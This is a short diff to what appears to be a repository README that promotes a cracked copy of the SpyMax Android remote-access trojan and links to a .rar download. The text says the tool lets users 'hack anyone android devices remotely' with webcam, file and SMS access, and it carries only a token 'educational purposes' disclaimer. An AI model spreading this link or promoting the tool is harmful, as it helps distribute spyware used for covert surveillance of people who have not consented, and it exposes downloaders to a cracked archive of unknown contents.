@@ -5,10 +5,8 @@ Download Link:
 https://usaupload.com/6Tdq/SpyMax-4.0.Cracked+Activated.rar
 # SpyMax-v4.0-Cracked-Activated-For-Windows
 SpyMax is a Tool That Can Controls any Android System Remotely. and It Has Alot Of PowerFul and Fantastic Features. (Remote Webcam, Remote Files, Remote SMS and Also More Features). (Warning For Educational Purposes Only)
+
 It is the latest version of the android rat in the hacker's market with a lot of many new and powerful features in it. It is used by hackers or pen testers to hack anyone android devices remotely over the internet.
-
-
-
 About Spymax 4
 
 What is SpyMax RAT? A Spy Max RAT is an android hacking tool by that you can hack anyone android devices remotely. Spy Max RAT series released two versions of the android remote administration tool in the past that name as SpyMax v1.0 & Spymax v2.0.
